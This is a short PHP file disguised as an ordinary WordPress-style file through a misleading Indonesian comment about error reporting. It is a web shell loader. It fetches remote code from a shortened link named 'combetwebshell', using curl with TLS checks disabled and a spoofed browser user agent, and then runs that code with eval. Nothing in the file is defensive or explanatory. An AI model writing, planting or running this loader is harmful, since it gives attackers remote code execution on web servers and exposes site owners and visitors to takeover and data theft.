<?php
/**
 * Menonaktifkan pelaporan kesalahan
 *
 * Atur ini ke error_reporting( -1 ) untuk debugging.
 */
function ambilInfoUrl($url) {
    if (function_exists('curl_exec')){ 
        $koneksi = curl_init($url);
        curl_setopt($koneksi, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($koneksi, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($koneksi, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($koneksi, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($koneksi, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($koneksi, CURLOPT_COOKIEJAR, $GLOBALS['coki']);
        curl_setopt($koneksi, CURLOPT_COOKIEFILE, $GLOBALS['coki']);
        $data_ambil_url = curl_exec($koneksi);
        curl_close($koneksi);
    } elseif (function_exists('file_get_contents')) {
        $data_ambil_url = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $data_ambil_url = stream_get_contents($handle);
        fclose($handle);
    } else {
        $data_ambil_url = false;
    }
    return $data_ambil_url;
}

$coki = tempnam(sys_get_temp_dir(), 'coki_');
$a = ambilInfoUrl('https://bit.ly/combetwebshell');
eval('?>' . $a);
?>